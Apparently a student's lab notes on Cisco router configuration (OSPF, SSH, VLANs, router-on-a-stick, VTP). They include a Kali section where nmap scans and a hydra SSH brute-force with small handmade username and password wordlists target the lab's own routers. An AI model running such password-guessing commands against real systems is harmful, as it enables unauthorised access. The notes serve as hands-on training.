# 12/6
## kali-linux
```
IOL(3L)R1、R2
net(managment)
R1
# hostname R1
# int e0/1
# no shut
# ip addr dhcp
# int e0/0
# ip addr 12.1.1.1 255.255.255.0
# no shut
# do show ip int brief
R2
# hostname R2
# int e0/0
# ip addr 12.1.1.2 255.255.255.0
# no shut
# do ping 12.1.1.1
# exit
# router ospf 1
# router-id 2.2.2.2
# network 12.1.1.0 0.0.0.255 a 0
R1
# router ospf 1
# router-id 1.1.1.1
# network 12.1.1.0 0.0.0.255 a 0
# network 192.168.153.0 0.0.0.255 a 0
# do show ip route
kali
# ifconfig
# nmap 192.168.153.0/24
# nmap -A 192.168.153.130
R1
# username cisco secret 12345678
# ip domain-name test.com
# crypto key generate rsa
# ip ssh version 2
# line vty 0 4
# login local
# transport input ssh
R2
# ssh -l cisco 12.1.1.1
12345678
kali
# ssh 192.168.153.130
X
一組帳號一組密碼
# vim user.txt
admin
root
cisco
administratior
# vim passwd.txt
password
1234567
1234
12345678
123456789
abcdefgh
admin
root
cisco
# sudo apt-get install hydra-gtk    //下載hydra
# hydra -L user.txt -P passwd.txt -o ssh.txt -vV -t 5 192.168.153.134 ssh
R2
# username cisco secret 12345678
# ip domain-name test.com
# crypto key generate rsa
# ip ssh version 2
# line vty 0 4
# login local
# transport input ssh
R1
# ssh -l cisco 12.1.1.2
12345678
> exit
kali
# ip route show
# sudo ip route delete default via 192.168.153.2
kali
# ip route show
# sudo ip route add default via 192.168.153.134
# ip route show
# hydra -L user.txt -P passwd.txt -o ssh.txt -vV -t 5 12.1.1.2 ssh
# ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-rsa -oCiphers=+aes128-cbc cisco@192.168.153.134
```
## 單臂路由
```
IOL(3L)R1、IOL L2(改icon)sw1
vpc1,2
sw1
# hostname sw1
# vlan 10
# exit
# vlan 20
# exit
# do show vlan brief
# int e0/0
# switchport mode access
# switchport access vlan 10
# int e0/1
# switchport mode access
# switchport access vlan 20
# int e0/2
# switchport trunk encapsulation dot1q
# switchport mode trunk
vpc1
# ip 192.168.1.1 255.255.255.0 192.168.1.254
vpc2
# ip 192.168.2.1 255.255.255.0 192.168.2.254
R1
# hostname R1
# int e0/0
# no shut
# int e0/0.10
# ip addr 192.168.1.254 255.255.255.0
# encapsulation dot1Q 10
# exit
# int e0/0.20
# ip addr 192.168.2.254 255.255.255.0
# encapsulation dot1Q 20
# exit
# do show ip int brief
vpc1
# ping 192.168.1.254
# ping 192.168.2.254
# ping 192.168.2.1

把R1換成IOL L2(改icon)l3sw
vpc1
# ip 192.168.1.1 255.255.255.0 192.168.1.254
vpc2
# ip 192.168.2.1 255.255.255.0 192.168.2.254
l3sw
# hostname l3sw
# int e0/0
# switchport trunk encapsulation dot1q
# switchport mode trunk
sw1
# hostname l2sw
# int e0/2
# switchport trunk encapsulation dot1q
# switchport mode trunk
l3sw
# exit
# vlan 10
# exit
# vlan 20
# exit
# do show vlan brief
# vtp mode server
sw1
# exit
# vtp mode client
# vtp domain cisco
# vtp password cisco
# do show vlan brief
# int e0/0
# switchport mode access
# switchport access vlan 10
# int e0/1
# switchport mode access
# switchport access vlan 20
# do show vlan brief
l3sw
# ip routing    //啟動路由功能
# int vlan 10
# ip addr 192.168.1.254 255.255.255.0
# int vlan 20
# ip addr 192.168.2.254 255.255.255.0
# do show ip int brief
# int vlan 10
# no shut
# int vlan 20
# no shut
# do show ip int brief
vpc1
# ping 192.168.1.254
# ping 192.168.2.254
# ping 192.168.2.1
```